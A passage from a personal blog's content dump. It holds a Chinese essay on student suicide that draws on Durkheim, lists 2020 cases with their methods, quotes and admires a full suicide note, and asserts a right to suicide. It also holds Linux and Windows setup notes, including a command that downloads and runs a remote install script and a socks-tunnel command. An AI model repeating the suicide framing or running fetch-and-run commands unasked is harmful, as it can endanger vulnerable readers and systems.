离的现象都能立即呈现在我们眼前，挑战着我们的观念。以前我们高喊“知识就是力量”，深信“寒门出贵子”，但后来我们发现，苦尽甘来的不是做题家，而是丁真，小丑竟是我们自己，我们不得不接受“颜值即正义”，自嘲“累就对了，幸福是留给有钱人的”。在价值失范的社会，自杀是无声的控诉。\n如今，自杀率上升已经是一个摆在我们面前的问题，解决方法在哪？涂尔干认为必须从维持社会的有机团结入手，他提出了“职业群体”的制度，试图让职业群体取代家庭和宗教，发挥社会整合与调控的作用。我认为他的出发点是合理的，但他可能没有预见到百年后的世界，社会分工的细致程度大大加强了，社会的团结程度却没有提高，资本主义的确创造出了许多岗位，但职业群体却似乎无法承担整合社会成员的作用，而只是资本运作的副产品，它本身就是不稳定的，只要人无法创造经济价值，就会被无情地驱逐出这个群体，在这里仍然只有赤裸裸的利益关系。在我看来，任何将人不是作为目的，而是作为手段去连接的方式都无法维持社会的团结，因为人与人的关系已被异化，商品拜物教掩盖了真正的社会关系，它对现代社会控制之全面之隐蔽更甚于有史以来的一切宗教，不摆脱它的枷锁，任何从心理学的角度降低自杀率的尝试都是扬汤止沸。\n就在我完成读书报告后不久，拼多多员工猝死事件发生，这虽然不是严格意义上的“自杀”，但无疑正是我所设想的晚期资本主义利他型自杀的典型案例，拼多多官方最初的回应也充分暴露了资本无情的嘴脸：“你们看看底层的人民，哪一个不是用命换钱，我一直不以为是资本的问题，而是这个社会的问题，这是一个用命拼的时代，你可以选择安逸的日子，但你就要选择安逸带来的后果，人是可以控制自己的努力的，我们都可以。”看似客观合理甚至显得积极正能量的回答，却是十足的伪命题。因为即使只是顺应社会现有的规则，也已经是在以加强其合法性的方式参与其中。这个荒诞的世界，是你我共谋的世界。\n自杀永远不会消失，人应当拥有结束自己生命的权利，对部分人来说自杀不过是一种出于理性的选择。但这决不意味着当代社会大批量“生产”自杀的情况是合理的，当人被异化为商品，走投无路之人的自杀也就沦为了过剩商品的自我毁灭，这样的自杀并不是人自由意志的结果，而只是资本逐利的手段，是社会达尔文主义的体现，与其说这是自杀，不如说这是整个社会对个人的蓄意谋杀。与此同时，原本作为个人选择的自杀也被无孔不入的资本主义所寄生，必须将人从异化关系中解放，自杀本身也才能得到解放。\n“做题家”自杀案例分析——以北交大大三跳楼学生为例 背景信息 2020年是大学生自杀事件频发的一年，据网络人士不完全统计如下\n 2020年05月09日 中国传媒大学动画学院研三学生跳楼自杀, 家属认为自杀原因为导师薛燕平阻挠其毕业\n2020年05月23日 南通大学学生跳楼自杀，自杀原因未知\n2020年06月06日 中北大学本科生跳楼自杀, 自杀原因为考试sample作弊被发现\n2020年07月01日 中山大学大四毕业生跳楼自杀，自杀原因未知\n2020年07月30日 于青海可可西里失联的南京航空航天大学大四女生遗骸被发现 (是否属自杀存疑)\n2020年08月18日 南京航空航天大学飞行学院本科生跳楼自杀，自杀原因未知\n2020年08月31日 南京航空航天大学电子信息学院本科生跳楼自杀，自述自杀原因为自身极端理想主义\n2020年09月03日 内蒙古呼和浩特某高校大四女生跳楼自杀，自杀原因未知\n2020年9月初 浙江大学动科院女博士生烧炭自杀，自杀原因为导师压榨\n2020年9月初 上海交通大学自动化系研究生上吊自杀，自杀原因为导师龙承念压榨\n2020年09月10日 浙江理工大学启新学院本科生跳楼自杀，自杀原因疑学业问题\n2020年09月17日 北京交通大学土建学院大二学生跳楼自杀，自杀原因未知\n2020年09月19日 南京大学女博士生跳楼自杀, 自杀原因为导师压榨\n2020年09月19日 中北大学信息商务学院（独立学院）本科新生跳楼自杀, 自杀原因未知\n2020年10月05日 郑州大学本科生跳楼自杀，自杀原因未知\n2020年10月06日 兰州石化职业技术学院大三情侣烧炭自杀, 自杀原因为网贷负债\n2020年10月09日 四川大学华西医学院研二学生跳楼自杀，自杀原因未知\n2020年10月10日 南京审计大学大四学生跳楼自杀，自杀原因未知\n2020年10月上旬 重庆大学学生跳楼自杀，自杀原因未知\n2020年10月12日 江苏大学食品与生物工程学院本科生跳楼自杀, 校方认为自杀原因疑学习困难\n2020年10月12日 华南理工大学医学院学生跳楼自杀，自杀原因未知\n2020年10月13日 大连理工大学化工学院研三学生上吊自杀，自杀原因为毕业压力大，微博名“红烧土豆叶”\n2020年10月14日 广东工业大学华立学院（独立学院）本科生跳楼自杀，自杀原因未知\n2020年10月19日 成都理工大学地质系大一学生于东风渠校内桥梁处失踪，自述找不到生命的意义\n2020年10月22日 北京师范大学博士生跳楼自杀, 自杀原因未知\n2020年10月24日 中南财经政法大学本科生自杀, 自杀原因未知\n2020年10月26日 郑州商学院电气专业大三女生跳楼自杀，自杀原因未知\n2020年10月27日 北京理工大学研三学生跳楼自杀，自杀原因未知\n2020年11月02日 湖南师范大学商学院本科生上吊自杀, 家属认为自杀原因为学工老师肖鹏压榨\n2020年11月05日 合肥工业大学机械学院大二学生跳楼自杀，自杀原因未知\n2020年11月11日 三峡大学本科生跳楼自杀，自杀原因未知\n2020年11月11日 台湾大学陆籍研究生自杀，自杀原因为长期失眠\n2020年11月14日 浙江理工大学政法系学生上吊自杀，自杀原因未知\n2020年11月16日 上海大学数学系大二女生跳楼自杀，自杀原因未知\n2020年11月18日 内蒙古呼和浩特某学院一男学生跳楼自杀，自杀原因未知\n2020年11月18日 上海交通大学密歇根学院学生跳楼自杀，抢救数日后死亡，自杀原因未知\n2020年11月19日 武汉工程大学学生跳楼自杀，自述“自己太笨了、太累了”，B站名“琉科Ryuko”\n2020年11月20日 中山大学公共卫生学院（深圳）毕业年级研究生服药自杀，自杀原因未知\n2020年11月22日 达州职业技术学院大二女生跳楼自杀，自杀原因未知\n2020年11月25日 石家庄铁道大学本科生跳楼自杀，自杀原因未知\n2020年11月25日 四川农业大学学生跳楼自杀，自杀原因未知\n2020年11月28日 中山大学研究生跳楼自杀，自杀原因未知\n2020年11月30日 河南牧业经济学院学生跳楼自杀，自杀原因未知\n2020年12月03日 河南财经政法大学大二女生跳楼自杀，自杀原因未知\n2020年12月03日 湖南第一师范学院外国语学院大四女生上吊自杀，自杀原因未知\n2020年12月04日 南京大学学生烧炭自杀，重度烧伤，现抢救中\n2020年12月05日 西北工业大学本科生跳楼自杀，自杀原因未知\n2020年12月05日 黑龙江科技大学建工学院学生跳楼自杀，自杀原因未知\n2020年12月06日 黑龙江科技大学女生上吊自杀，自杀原因未知\n2020年12月07日 黑龙江科技大学计算机学院学生跳楼自杀，自杀原因未知\n2020年12月08日 广东药科大学卫检专业大二学生于广州大学城新洲村新洲河堤处失踪，12月16日确认离世\n2020年12月13日 安徽师范大学学生跳楼自杀，自杀原因未知\n2020年12月13日 吉林大学莱姆顿学院学生跳楼自杀，自杀原因未知\n2020年12月15日 北京交通大学机电学院大三学生跳楼自杀，自杀原因为“为追求‘全面发展’而舍弃了自身唯一的‘做题’优势，后来\u0026rsquo;意识到问题所在时，为时已晚'”\n2020年12月16日 吉林大学莱姆顿学院学生服药自杀，自杀原因未知\n 从以上数据中，可以看出此类自杀事件具有以下特征：\n 自杀者多为理工科专业学生，男女均有，全国各地各层次高校均有分布 自杀方式多为跳楼，也有上吊、烧炭、失踪 存在同一高校出现连续多人自杀的情况 自杀原因若能明确则多为学业压力和理想破灭，研究生自杀多与导师有关  由于数据统计上的偏差，以上判断仅为个人分析结果，不具备较强的严谨性。但大致可以看出这类自杀现象已不是几个特例，而成为一种典型，可以称之为“做题家”的自杀。由于自杀者的个人信息不便公开，相关资料严重缺乏，下面就其中一位自杀者留下的长篇遗书进行分析，以窥见整个自杀群体的共同心声。\n文字材料—当事人遗书  “再见，各位我所熟识的，或是陌生的人们。 如果你们看到了这段文字，那就说明，我以自己的意志，经过深思熟虑，选择了毁灭自己，这无关任何人，和学校，和辅导员没有任何关系，和我的同学，或是我熟识的人更没有任何关系，希望我的室友或是什么和我关系亲密的人不要借此去闹事。如果你们因此而获得了保研的资格，或是别的什么更大的利益，那对于我们身边那些少说奋斗了三年，多说奋斗了二十年的同学或是同胞不公平。另外，如果你们真的白嫖了三个保研名额的话——为什么不是五个呢？我觉得咱们寝室确实有两个人值得——你们就得给我立个牌位供起来，明白？ 我不会试图塑造一个完美的死者形象，那样的形象只能给人一种“我的自杀是一幕毁灭了某种美好事物的悲剧”的印象，只有把一个千疮百孔，扭曲至极的我展现出来，才能让你们体会到选择毁灭的必要性——然而我并不能将这样的自己完全展示出来，因为在写下这段又臭又长的文字的同时，我那些扭曲的，疯狂的，淫猥的想法已经随着我的毁灭一起，埋葬在我的脑海中。 二十年来我坚信做题是唯一出人头地的途径，我因此放弃了其他的方向，使得做题成为我唯一而且是最为突出的优势，并且相信这是唯一的正途。到了大学之后，我竟然听信了某些自由派的鬼话，妄图“全面发展”，因而舍弃了做题这一优势项目。当我意识到问题所在时，为时已晚。这不啻于我的“戈尔巴乔夫改革”，摧毁了我的根基。接下来呢？生活无望，希望崩塌，对明天的期待已经毁灭殆尽，没有了信念和理想。很多美好的事物都毁在这一点上。因为没有了信念，斯大林格勒的62集团军的红军战士们最后退化成了阿富汗战争里的炮灰；的黎波里海岸上的美国海军陆战队变成了PTSD集中营。至于我，失去信念和理想之后就是今天的结局——“苏联解体”。 然后呢？现在的我不知道未来是什么，不知道我想要什么。灵魂的惯性迫使我沿着原有的轨迹前进，而我的灵魂早就没有了一分再向前推进的力气，支撑着我一步一步走下去的只有我对于别人的承诺，这一天的到来是我的决定，不再履行对别人承诺的决定。我被自己失去动力的灵魂拖着前进，今天它的动量在阻力的长久影响下消耗殆尽了，而我也就决定要离开这个世界。毕竟这样活着也没什么意思，一边把自己伪装的上进阳光而且乐观，一边又在别人看不到的角落里释放自己最阴暗的一面。我不再是之前那样的纯粹的一层，和吴法宪，张铁生之流已经没有区别。 我曾经痛恨过很多东西，资本家，白匪军，官僚，保守主义的老棺材瓤子以及它们的走狗们。但是我已经等不到亲手消灭它们的那一天了，同志们，请代替我完成这个任务，拜托了。 好了，和所有人要说的话说完了，接下来我要给一些对我而言很重要的人单独留下一些话。我希望你们能确保下面的话只有他们自己能看见，毕竟在没有特定语境的情况下，我对一个人说的话多半会被误解成另一个意思，这是我动身前最后一个愿望——学校的话，不必去查找那些信件了，那里面没有你们想知道的东西，只有一些我不想让别人知道的东西，其中并不包括我为什么要这么做，因为这个问题的答案在上面已经很明确了。 最后——尽管叶赛宁的诗据说被网易云用户给玩烂了，不过我觉得用叶赛宁辞世之前在列宁格勒的旅馆里用自己的血写下的绝笔作为我对世界的告别还是挺合适的： 再见吧，我的朋友，再见 亲爱的，你永在我的心间。 命中注定要相互离别， 许诺我们在前方相见 再见，朋友，不必悲伤， 也没有必要愁容满面。 人世间死已不是新鲜事。 而活着，也不见得，更为新鲜。”\n 案例解读 当事人的遗书较长，且运用了较多修辞，为便于理解我按顺序将其拆解为以下几个部分：\n 预先替他人开脱责任；呼吁熟人不要借此闹事而从中牟利；为自己的自杀行为定性——经过了慎重考虑但不是完美纯洁的受害者而是扭曲后必然的毁灭 阐述自己的心路历程：进大学前一心“做题”—听信“自由派”妄图全面发展—发现丧失“做题”能力后失去信念希望崩塌 倾诉自己失去动力后强颜生活的麻木和内心的自闭阴暗 表达自己对部分社会成员的痛恨，希望后来人最终消灭之 对一些重要的人单独留话，让学校不必白费工夫从信件里查找自杀原因 最后以叶赛宁的绝笔诗向世界告别  尽管资料有限，但仅从当事人的遗书中，已经可以发现许多。他应该是一个温柔善良的人，处处替他人考虑，也为学校着想，对历史典故甚至是一些较为禁忌的人物生平都知之甚多，还能恰到好处地引用外国诗人的诗，人文素养不差。全文饱含浓烈情感而又娓娓道来，并无激烈言语发泄愤怒，惟有平静叙述宣告心死，相信读者无论是否有相同的经历，都会为之动容。\n但就是这样一个对世界充满善意的大学生，为何早早地而且是“经过深思熟虑”后选择了自我毁灭？\n正如他自己所说，“问题的答案在上面已经很明确了”，第3部分他的心路历程说明了一切。简言之就是，“做题家”尝试改变自我走进新天地，到头来却发现丢失了自己的基本盘，最终丧失信念。\n“做题家”“内卷”这些词汇已经十分流行，之前同样地处北京的某高校曾有传闻称学生熬夜学习猝死，尽管事后当事人澄清只是一时昏迷并无生命危险，但足以说明大学生内卷过度以至于损害身体健康是多么普遍。不过北交大这位学生的案例在典型的同时又有其特别之处，便是他曾经“听信自由派的鬼话”，有过一段尝试“全面发展”的时期，这是将他与其他“做题家”区分开来的地方，但尝试的结局却又证明了他终究不可能和“做题家”分道扬镳，因为他终于认识到了作为没有资源没有背景的普通大学生，追随“自由派”去“全面发展”并不能带来收益，反而削弱了他唯一可以依靠的硬实力，或许是绩点、科研、竞赛，我们无从得知。但压垮他的并不是这些筹码本身，他本可以重新加入“做题家”的行列努力扳回一城，然而他没有，他倦了，他的信念已然崩塌。他放下笔去做一个“自由派”时越轻盈越愉快，他就越没有勇气越不愿捡起笔再去做题，纵然那是一场梦，也不愿醒来。\n但在某种程度上，他又是幸运的。他可能以为如果没有“自由派”的蛊惑，如果他的“做题”根基依然牢固，他就能继续在正途上前进，也许就能凭着过硬的绩点保研到理想的学校，赢得光明的前景。但众多研究生自杀的案例摆在眼前，其中不乏来自名牌高校者，他们其实就是北交大学生的另一种结局，是的，仍然是自杀的结局，只不过多了几年煎熬岁月，多了一层痛苦领悟，最终他们会发现，原来“做题”也只是一条看不到终点的道路，原来没有摩西的手杖就不能让湍流变坦途。\n我们都在玩着一个没有赢家的游戏，无论是中途体力透支倒下，还是技不如人自刎而亡，或是取得了阶段性的胜利，最终却都走向了自杀的道路，这究竟是为什么？我想出问题的是游戏本身，我们已经忍受了野蛮的规则，为之展开了激烈的竞争，到头来又被告知另有一套评分体系，那之前的努力意义何在？一旦产生这种疑问，自杀就在招手了。\n结语 通过对大学生自杀案例的分析，我希望淡化对自杀者本身性格缺陷的放大和谴责，而关注自杀群体的共性特征，追问大学生自杀现象频繁出现的病灶，但愿这个世界多一点关怀和公正。真的猛士，自会奋然前行，如何能让苟活者在淡红的血色中，依稀看见微茫的希望，更是我们要思考的问题。\n","date":"2020-12-30T00:30:02Z","permalink":"https://chinggg.github.io/post/suicide/","tags":["随笔"],"title":"自杀研究：读书报告与案例分析"},{"categories":["记录"],"contents":"Network For hardware stuff, see Wireless\nSSH Key-Auth ssh-keygen -t rsa\nhost {shortName} Hostname {address} Port 22 User {username} IdentityFile {path/to/key}  do not forget to set private key 600\nWin10-OpenSSH-Server   Install from Settings UI : Optional Features\n  Install from PowerShell : Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0\n  ===Start-Service   Start-Service sshd # OPTIONAL but recommended: Set-Service -Name sshd -StartupType 'Automatic' # then back to local machine: ssh username@servername  Win32-OpenSSH PS: Set-ExecutionPolicy RemoteSigned or powershell -ExecutionPolicy Bypass -File .\\install-sshd.ps1\nSSH-Tunnel http://wlwang41.github.io/content/ops/ssh%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86.html\nhttps://www.ibm.com/developerworks/cn/linux/l-cn-sshforward/\nSSHFS sshfs -C -o reconnect,ServerAliveInterval=15,ServerAliveCountMax=3 \u0026lt;server\u0026gt;:/path /path\nProxy export http_proxy=\u0026quot;http://localhost:1082/\u0026quot; export https_proxy=\u0026quot;http://localhost:1082/\u0026quot; export ftp_proxy=\u0026quot;http://localhost:1082/\u0026quot; export socks_proxy=\u0026quot;http://localhost:1080\u0026quot; export no_proxy=\u0026quot;127.0.0.1,localhost\u0026quot; export ALL_proxy=\u0026quot;socks5://127.0.0.1:1080\u0026quot;  apt: /etc/apt/apt.conf.d/12proxy\nAcquire { HTTP::proxy \u0026quot;http://127.0.0.1:1082\u0026quot;; HTTPS::proxy \u0026quot;socks5h://127.0.0.1:1080\u0026quot;; }  Git: git config --global http.proxy 127.0.0.1:1082\nhttps://note.qidong.name/2020/05/docker-proxy/\nServer ./ew -s ssocksd -l 1080\nClient tsocks: /etc/tsocks.conf\nproxychains: /etc/proxychains.conf\niptables iptables 设计非常灵活，不仅可以当防火墙，还可以进行端口转发，ip 分组过滤等等复杂的功能，甚至可以把它当成微型的编程语言，所以要先俯瞰 iptables 整体的操作逻辑\nTable, Chain 和 Rule 最简单的说法就是 Table 由很多个 Chain 组成，而 Chain 由一些 Rule 串起来组成， 所以称之为”链“。\nRule 就是对于请求一个断言，如果请求满足断言就执行指定的操作（官方文档中称这个操作为目标，Target），举个例子，”如果请求来自 192.168.19.123，就将其拒绝“，这就是一个 Rule，而”拒绝“就是一个目标，常见的目标有接受，拒绝，转发，调用另一个 Chain 等等。\n请求会在 Chain 中自上而下遍历，直到遇到一个匹配的 Rule，然后调用它的目标。\n四表五链 iptables 中 Table 的数目是规定死的四个：\n filter: 过滤功能 nat: 端口映射，地址映射等 mangle: 用于对特定数据包的修改 raw: 优先级最高的 Table  还有五个预定义的 Chain：\n  PREROUTING: 数据包进入路由表之前\n  INPUT: 通过路由表后目的地为本机\n  FORWARD: 通过路由表后，目的地不为本机\n  OUTPUT: 由本机产生，向外转发\n  POSTROUTIONG: 发送到网卡接口之前。如下图：\n   路由决策是指判断数据包的目的地是否是本机，如果是则进入 INPUT Chain，否则进入 FORWARD Chain\n  PREROUTING ，POSTROUTIONG 和 FORWARD 只有作为路由器使用时才会被调用，正常电脑就只会经过 INPUT 和 OUTPUT\n 每个 Table 都含有几个预定义 Chain，优先级从高到低：raw \u0026gt; mangle \u0026gt; nat \u0026gt; filter\n将内置的所有 Chain 串起来看就如下图：\n目标 比如下面的命令：\niptables -A INPUT -p tcp --dport 80 -j ACCEPT 表示如果发现目标端口是 80 的 tcp 流量就放行，其中 -p tcp \u0026ndash;dport 80 就是条件，而 ACCEPT 就称作目标（Target）了。\n-A INPUT 表示将这条 Rule 追加到（Append）INPUT Chain 的最后面，这里没有指定 Table，默认就是 filter，也可以通过 -t 指定 Table。\n常见的目标有：\n ACCEPT:接收数据包 DROP:丢弃数据包 REJECT:丢弃数据包并且返回一个拒绝 REDIRECT:将数据包重定向到另一个端口  匹配条件除了上面两个，还有一些常用的：\n -s 匹配来源 ip \u0026ndash;sport 匹配来源端口 -m state 状态匹配，表示匹配数据包的状态，比如 -m state \u0026ndash;state ESTABLISHED 就表示匹配已经建立了连接的数据包  RDP HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\\Tds\\tcp\nHKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\nPortNumber then restart\n(官方文档只列出第二处)\nAria2 Aria2常见问题\nLinux Power 合盖的不同设定：\n poweroff 和 halt 均是关机（具体实现有区别） hybernate 是休眠，设备断电（同关机状态），内容保存在硬盘中 hybrid-sleep 是混合睡眠，设备通电，内容保存在硬盘和内存中 supspend (或 sleep)是挂起（睡眠），设备通电，内容保存在内存中 lock 是锁屏 kexec 是从当前正在运行的内核直接引导到一个新内核（多用于升级了内核的情况下） ignore 是忽略该动作，即不进行任何电源事件响应  BOOT uncomment GRUB_DISABLE_OS_PROBER=false in /etc/default/grub\nREISUB  Add GRUB_CMDLINE_LINUX_DEFAULT the sysrq_always_enabled=1 variable in /etc/default/grub OR Execute echo kernel.sysrq=1 | sudo tee --append /etc/sysctl.d/99-sysctl.conf AND Execute sudo update-grub or sudo grub-mkconfig -o /boot/grub/grub.cfg  Laptop: Fn+Alt+PrtSc\nOnce you’ve located your SysRq key, please keep the Alt key pressed.\nPackage Manager pacman speed up : XferCommand = /usr/bin/aria2c -x 8 -s 8 --dir $(dirname %o) -o $(basename %o) %u\n-S -U -Q -R\npacman -Qoq /usr/lib/python3.9\nyay Arch 不可直接 pacman 装，clone yay-bin from AUR, makepkg -si\nTerminal Zsh move to zinit\n[[ -f ~/.private.zsh ]] \u0026amp;\u0026amp;s source ~/.private.zsh\nKonsole \u0026lt;c-(\u0026gt; \u0026lt;c-)\u0026gt; split\nYakuake New Session \u0026lt;c-s-T\u0026gt;\nClose Session \u0026lt;c-s-W\u0026gt;\nNext Session \u0026lt;s-Right\u0026gt; ('')\nTmux set -g mouse on setw -g mode-keys vi  KDE Add Panel to the top, Global Menu added by default\nInstall widget Active Window Control to hide title bar for maximized windows\nInstall latte-dock to imitate OS X. Finally I chose to add widget Icons-Only Task Manager to the left of the panel.\nbalooctl disable\nSettings -\u0026gt; Window Behavior -\u0026gt; Window Actions -\u0026gt; Inner Window 左手按键右手鼠标轻松操纵窗口\nFcitx5 \u0026lt;c-7\u0026gt; to remove word from history\n\u0026lt;c-;\u0026gt; to show clipboard by default, having been reset to \u0026lt;c-'\u0026gt;\nUNICODE: Ctrl+Alt+Shift+U\nScripts insert \\ at each EOL: sed -i 's/$/ \\\\/ FILENAME'\ninsert text at the beginning: sed -i '1i text' FILENAME\nWindows 快速配置 手装：\n Git VS Code VS Firefox Windows Terminal, WinGet 保证最新版  Set-ExecutionPolicy RemoteSigned -scope CurrentUser Invoke-Expression (New-Object System.Net.WebClient).DownloadString('https://get.scoop.sh') scoop bucket add extras versions java retools scoop install sudo dismplusplus  编辑 .ssh/config\nWin7 only support Python3.8, does not support Docker\nKB3063858 if fail to install Python\nDevelopment Git 使用 ssh 代替 https进行 git 远程操作可以省去每次输入帐号的重复步骤，尽管一开始的密钥配置会略显繁琐。\nssh-keygen -t rsa -C \u0026quot;Whatever\u0026quot; #输入文件名，按两次回车 #ssh-agent -s 无效，则用下面这条 eval $(ssh-agent -s) ssh-add ~/.ssh/id_rsa  Git配置多个SSH Key\n多SSH管理技巧与Git多账户登录\nundo the first commit: git update-ref -d HEAD\nclone from computers: git clone ssh://hostname/path/to/git\n工作生活两不误之 includeIf 语法：\n[includeIf \u0026quot;gitdir:/path/to/repo\u0026quot;] path = /path/to/.gitconfig-oss [includeIf \u0026quot;gitdir:C:/work/\u0026quot;] path = /path/to/.gitconfig-work  Win 上 Git 问题总结：\n Load key invalid format: [https://stackoverflow.com/questions/41563973/git-clone-key-load-public-invalid-format-permission-denied-publickey]  Vim fail to install YCM\nquick comment  \u0026lt;c-V\u0026gt; to enter visual block mode move around to select lines to comment press \u0026lt;s-I\u0026gt; and insert # or // \u0026lt;Esc\u0026gt; then see changes  clipboard inconsistency vim does not support Xorg, missing the +clipboard support. replace it with gvim\nuse \u0026quot;+y to copy to the system clipboard\nto change the default behavior set clipboard=unnamedplus\nresize window \u0026lt;c-W\u0026gt; -/+上下 \u0026lt;\u0026gt;左右\nencode enc,fenc,fencs,tenc\n  enc (encoding) 内部使用的编码\n如buffer，寄存器中的字符串。在Vim打开文本后，如果它的编码方式与它的内部编码不一致，Vim会先把编码转换成内部编码，如果它用的编码中含有没法转换为内部编码的字符，那么这些字符就会丢失掉。默认值是系统的locale来决定。\n  fenc( fileencoding) 文件自身的编码\n从磁盘读文件时，Vim会对文件编码检查，如果文件的编码与Vim内部编码（enc）不同，Vim就会对文本做编码转换，将fenc设置为文件的编码。Vim写文件到磁盘时，如果enc与fenc不一样，Vim就做编码转换，转换成编码fenc保存文件。\n  fencs( fileencodings ) 字符编码的列表\n编码的自动识别就是通过设置fencs实现的。当打开一个文件时，Vim会按照fencs中编码的顺序进行解码操作，如果匹配成功就用该编码来进行解码，并把这种编码设为fenc的值。这里的匹配成功指的是Vim能正确解码，不会出错，但是不保证没有乱码，所以fencs编码列表的顺序设置很关键。latin1是iso8859-1，属于国际化的标准编码，能表示任何字符，所以放到最后\n  tenc( termencoding) 终端使用文本编码，或者说是Vim用于屏幕显示时的编码，显示的时候Vim会把内部编码转换为屏幕编码再输出，也就是说我们从屏幕上看到的字符都是tenc编码的字符，如果为空，默认就是enc。windows平台Gvim会忽略掉tenc。一般就是从一个终端远程登陆到linux系统时候tenc会起作用。\n  VSCode Window: Title Bar Style choose custom\nShortcuts \u0026lt;c-B\u0026gt; toggle side bar\n\u0026lt;c-J\u0026gt; toggle panel\n\u0026lt;c-`\u0026gt;toggle integrated terminal\n\u0026lt;c-K\u0026gt; leader key\n \u0026lt;c-O\u0026gt; Open Folder \u0026lt;c-S\u0026gt; Keyboard Shortcut  vscodevim set a shortcut to \u0026ldquo;Vim: Toggle Vim Mode\u0026rdquo;\n press \u0026lt;c-K\u0026gt;\u0026lt;c-S\u0026gt;, search for it bind it to Ctrl+' (the default shortcut of fcitx5 clipboard is Ctrl+;)  press gcc to comment\nfiles.exclude   Go to File -\u0026gt; Preferences -\u0026gt; Settings (or on Mac Code -\u0026gt; Preferences -\u0026gt; Settings)\n  Pick the workspace settings tab\n  Add this code to the settings.json file displayed on the right side:\n// Place your settings in this file to overwrite default and user settings. { \u0026quot;settings\u0026quot;: { \u0026quot;files.exclude\u0026quot;: { \u0026quot;**/.git\u0026quot;: true, // this is a default value \u0026quot;**/.DS_Store\u0026quot;: true, // this is a default value \u0026quot;**/node_modules\u0026quot;: true, // this excludes all folders // named \u0026quot;node_modules\u0026quot; from // the explore tree // alternative version \u0026quot;node_modules\u0026quot;: true // this excludes the folder // only from the root of // your workspace } } }    large workspace cat /proc/sys/fs/inotify/max_user_watches echo fs.inotify.max_user_watches=524288 \u0026gt;\u0026gt; /etc/sysctl.conf  For Arch:\nls /etc/sysctl.d/*-max_user_watches.conf  echo fs.inotify.max_user_watches=524288 | sudo tee /etc/sysctl.d/50-max_user_watches.conf \u0026amp;\u0026amp; sudo sysctl --system  cat /proc/sys/fs/inotify/max_user_watches  CodeBlocks Missing api-ms-win-crt-*.dll\nInstall VC++ 2015 Redistributable\nFail on Windows Server 2012\nSQL mysql -u {user} -p  ENTER\npostgres \\i 'path/name.sql' to load SQL script\n\\! \u0026lt;command\u0026gt; to run shell command\nshould disable CoW with chattr +C /var/lib/postgres on btrfs\nVirtualize boot VM from physical windows partition，即利用 VBoxManage 从（整个）物理磁盘创建 vmdk，注意 UEFI 启动。VMWare 会自动识别 vmdk 实际指向物理设备而报错，直接从物理磁盘创建即可。注意不要作死启动宿主机系统自身！\nDocker sudo groupadd docker sudo usermod -aG docker $USER docker-compose on PM may be too old, use pip to install, then add $HOME/.local/bin to PATH\nDockerfile best practices\ndocker image/container prune [--filter=]\ndocker container rm $(docker ps -aq -f \u0026quot;since=删掉这个名字对应容器之后创建的所有容器\u0026quot;)\n容器有网络相关错误可能是net.ipv4.ip_forward=0 临时解决 run --network=host\nK8S 一切皆 yaml\n注意 --namespace\n一般不直接 ssh node\nkubectl port-forward pod-name LocalPort:RemotePort\nlibvirt https://ostechnix.com/solved-cannot-access-storage-file-permission-denied-error-in-kvm-libvirt/\nHardware Wireless lspci, rfkill see if blocked\n蓝牙耳机可配对但无法连接： 安装 pulseaudio-bluetooth(怎么 PA15 还不支持高级编码) pulseaudio-modules-bt(https://aur.archlinux.org/packages/pulseaudio-modules-bt/) 再重启 pulseaudio，或者直接上 pipewire\nhowdy https://wszqkzqk.github.io/2021/08/17/%E5%9C%A8Manjaro%E4%B8%8B%E9%85%8D%E7%BD%AE%E4%BA%BA%E8%84%B8%E8%AF%86%E5%88%AB/\n找摄像头路径，sudo howdy config 该配置\n由于 kwallet 原因对 sddm 用处不大\nkde, login, system-local-login 以在锁屏启用，必加 try_first_pass\nsu, sudo 不加 try_first_pass，因为在终端中可 C-c。单独 su 需要在 /usr/lib/security/howdy/models 下ln -s user.dat root.dat\nlinux-enable-ir-emitter 开红外，重启后失效的解决方法\nFile System BtrFS 中文博客：https://qsdrqs.site/2021/01/ext4_to_btrfs/ 大概可从 ext4 无损转换，但 grub 等引导项配置需要避坑\n 改 fstab 中的 UUID 和 type 转换根目录，需要 mkinitcpio -P grub-intall 和 grub-mkconfig  新装也需注意，只划整个分区不创子卷意义不大，安装时没注意也可以弥补，只需 chroot 环境下挂载分区，于根目录创建 @name 子卷，再把原来位置的内容移进去，最后分区目录结构如下\n/dev/nvme0n1p4 ├── @ ├── @cache # /var/cache ├── @home ├── @log # /var/log ├── @opt ├── timeshift-btrfs └── @tmp # /var/tmp  snapper 快照\nLVM pvs, pvcreate /dev/\u0026lt;foo\u0026gt;\nvgs vgextend VG PV\nlvs lvresize -l 100%FREE VG/LV\nresize2fs VG/LV  别忘了文件系统扩容\nNTFS sudo mount -t ntfs-3g /dev/nvme0n1p4 /path/to/mount\nNFS CentOS 7安装配置NFS CentOS 7 下 yum 安装和配置 NFS\nServer:\n create folder start servers rpcbind nfs-server edit /etc/exports  exportfs -r showmount -e    Client:\n rpcbind mount [IP]:/ /path/to/mount  VHD Ventoy 插件可启动 VHD 中的文件，虚拟机和U盘启动两不误\n最简单的方法，在 VBox 创建磁盘格式为 VHD 的虚拟机再复制即可\nMPICH\nhttps://stackoverflow.com/questions/14769599/mpi-error-loading-shared-libraries\n總結 用心记,放心阅,方便查\nManjaro踩坑记\nafter remove /bin\ndelete file without rm shred -u unlink\n问题记录 Ubuntu 16.04 to 18.04 断网 能 ping 固定 IP 但 ping 不通域名\nedit /etc/systemd/resolved.conf, let DNS=8.8.8.8\nsystemctl restart systemd-resolved\nDO NOT EDIT /etc/resolv.conf with 127.0.0.53 as a **stub resolver **!\nKDE 桌面崩溃 kquitapp5 plasmashell kstart5 plasmashell killall ksmserver  触摸板突然失灵 sudo modprobe -r i2c_hid # 先卸载模块,或psmouse sudo modprobe i2c_hid # 再装上模块 sudo systemctl daemon-reload #非必须 sytemctl suspend  VMWare报错 先检查是否装对应kernel版本的linux-headers\n每次开机后再输sudo modprobe -a vmw_vmci vmmon\n上述命令亦无效则是kernel版本太新尚无module可用，参见此贴中的步骤，下载该仓库中对应版本执行make即可编译完成\nvmnet8 报错无法联网：sudo systemctl start vmware-networks.service\n基于Qt的软件无法使用fcitx qmake -query查看qt版本及路径等信息\n中文字体选择 常用Web字体\n网页字体测试\nKDE中文字体美化\n","date":"2020-10-28T04:45:41Z","permalink":"https://chinggg.github.io/post/setup/","tags":["环境配置","长期"],"title":"Setup"},{"categories":["随笔"],"contents":"因循的四象限 原文:The Four Quadrants of 